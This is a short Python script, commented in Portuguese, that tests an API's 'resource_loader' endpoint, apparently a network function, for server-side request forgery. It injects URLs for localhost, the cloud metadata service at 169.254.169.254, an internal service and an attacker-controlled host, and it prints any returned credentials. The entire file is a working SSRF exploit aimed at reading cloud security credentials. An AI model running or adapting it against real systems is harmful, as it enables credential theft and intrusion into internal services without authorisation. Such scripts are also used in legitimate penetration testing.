import requests
import urllib3
import json
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

NF_API_URL = "https://127.0.0.1:8000/api/resource_loader"
TARGET_PARAMETER = "url"

test_endpoints = [
    "http://127.0.0.1:80",
    "http://169.254.169.254/latest/meta-data",
    "http://[IP_INTERNO_DA_NF]:[PORTA_DO_SERVICO]",
    "http://[SEU_IP_DE_ATAQUE]:8080"
]

print("[+] Testando Sever-Side Request Forgery (SSRF)...")

for url in test_endpoints:
    payload = {TARGET_PARAMETER: url}
    print(f"[*] Tentando injetar URL: {url}")
    try:
        start_time = time.time()
        response = requests.post(NF_API_URL, headers={"Content-Type": "application/json"}, data=json.dumps(payload), timeout=5, verify=False)
        end_time = time.time()

        if response.status_code == 200 and "security-credentials" in response.text:
            print("[!!!] VULNERABILIDADE SSRF DETECTADA! Acesso a metadados de nuvem.")
            print(f"      Conteúdo do recurso: {response.text}")
            break
        if response.status_code == 200 or response.status_code == 302:
            print(f"[!] Possível SSRF detectada! Status {response.status_code} na URL '{url}'.")
            
        response_time = end_time - start_time
        if response_time > 3:
            print(f"[!] Possível SSRF Blind detectada! Requisição para '{url}' demorou {response_time:.2f} segundos.")

    except requests.exceptions.RequestException as e:
        print(f"[-] Erro ao injetar URL '{url}': {e}")